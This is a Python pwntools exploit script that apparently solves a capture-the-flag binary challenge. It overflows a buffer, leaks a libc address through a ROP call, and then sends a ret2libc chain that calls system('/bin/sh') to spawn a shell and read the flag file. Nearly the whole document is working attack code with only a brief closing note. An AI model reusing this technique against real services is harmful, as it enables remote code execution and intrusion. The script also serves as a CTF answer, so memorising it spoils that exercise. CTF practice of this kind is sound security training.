#!/usr/bin/env python3

from pwn import *

TARGET = './chall'
HOST = ''
PORT = 1337

elf = ELF(TARGET)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
ld = ELF('/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2', checksec=False)

context.arch = 'amd64'
gdb_script = f"""
  # b *main
  b *vuln+45
  c
"""
# context.log_level = 'DEBUG'

if args.GDB:
  context.terminal = ['wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc']
  p = gdb.debug(TARGET, gdbscript=gdb_script)
elif not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

# ===================================== #

pop_rdi = 0x401182
ret = pop_rdi + 0x1

# Get libc leak #
leaky_payload = b'A' * 32 + b'B' * 8 + p64(pop_rdi) + p64(0xa59a12d) + p64(elf.sym.leaky) + p64(elf.sym.main)
print(len(leaky_payload))
p.sendafter(b'?> ', leaky_payload)

libc.address = u64(p.recv(8)) - libc.sym.system
print(f"libc base: {libc.address:#x}")

rop = ROP(libc)
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym.system
rop_gadget = p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
print(f"/bin/sh : {hex(binsh)}")
print(f"system(): {hex(system)}")
# ========== #

# Buffer overflow (ret2libc) #
payload = b'X' * 32 + b'Y' * 8 + rop_gadget
p.sendafter(b'?> ', payload)
# ========== #

sleep(0.5)
p.sendline(b'ls ; cat flag*')

p.interactive()

# NOTE:
# Buffer Overflow
# Ret2libc
